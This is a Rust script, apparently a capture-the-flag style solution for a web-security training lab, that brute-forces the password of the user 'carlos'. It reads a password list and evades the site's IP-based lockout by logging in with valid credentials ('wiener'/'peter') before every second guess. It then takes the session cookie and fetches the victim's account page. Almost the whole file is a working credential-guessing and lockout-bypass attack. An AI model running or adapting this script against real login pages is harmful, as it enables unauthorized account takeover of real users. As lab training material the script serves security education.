/*********************************************************************
*
* Lab: Broken brute-force protection, IP block
*
* Hack Steps: 
*      1. Read password list
*      2. Brute force carlos password (login with as wiener before 
*         each try to bypass blocking)
*      3. Fetch carlos profile
*
**********************************************************************/
use lazy_static::lazy_static;
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    fs::{self},
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a76002b04a3d78d80d2ef6c00d80059.web-security-academy.net";

lazy_static! {
    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Reading password list.. ");

    let password_list = read_password_list("../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly

    println!("{}", "OK".green());
    println!("⦗2⦘ Brute forcing carlos password.. ");

    let carlos_session = brute_force_password(&password_list);

    if let Some(valid_session) = carlos_session {
        print!("⦗3⦘ Fetching carlos profile.. ");
        fetch_with_session("/my-account", &valid_session);

        println!("{}", "OK".green());
        print_finish_message();
    } else {
        println!("{}", "\n⦗!⦘ Failed to get valid session for carlos".red());
    }
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn read_password_list(file_path: &str) -> Vec<String> {
    let passwords_big_string = fs::read_to_string(file_path)
        .expect(&format!("Failed to read the file: {}", file_path.red()));
    passwords_big_string.lines().map(|p| p.to_owned()).collect()
}

fn brute_force_password(passwords: &Vec<String>) -> Option<String> {
    let passwords_count = passwords.iter().count();

    for (index, password) in passwords.iter().enumerate() {
        // Make one successful login after every one try failed
        if index % 2 == 0 {
            let login_as_wiener = login("wiener", "peter");

            if login_as_wiener.is_ok() {
                println!("\n⦗*⦘ Making a successful login.. {}", "OK".green())
            } else {
                print_failed_password_try(password);
                continue;
            }
        }

        let elapsed_time = SCRIPT_START_TIME.elapsed().as_secs();
        print_progress(elapsed_time, index, passwords_count, password);

        let login_as_carlos = login("carlos", &password);

        if let Ok(response) = login_as_carlos {
            if response.status().as_u16() == 302 {
                println!("\n🗹 Correct password: {}", password.green());
                let valid_session = get_session_cookie(&response);
                return Some(valid_session);
            } else {
                continue;
            }
        } else {
            print_failed_password_try(password);
            continue;
        }
    }
    None
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "Failed to fetch carlos profile".red()))
}

fn login(username: &str, password: &str) -> Result<Response, Error> {
    let data = HashMap::from([("username", username), ("password", password)]);
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&data)
        .send()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn print_progress(elapsed_time: u64, counter: usize, passwords_count: usize, text: &str) {
    print!(
        "\r❯❯ Elapsed: {:2} seconds || Trying ({}/{}): {:50}",
        elapsed_time.to_string().yellow(),
        counter,
        passwords_count,
        text.blue(),
    );
    io::stdout().flush().unwrap();
}

fn print_finish_message() {
    let elapased_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
    println!("🗹 Finished in: {} seconds", elapased_time.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green());
}

fn print_failed_password_try(password: &str) {
    println!("⦗!⦘ Failed to try the password: {}", password.red())
}
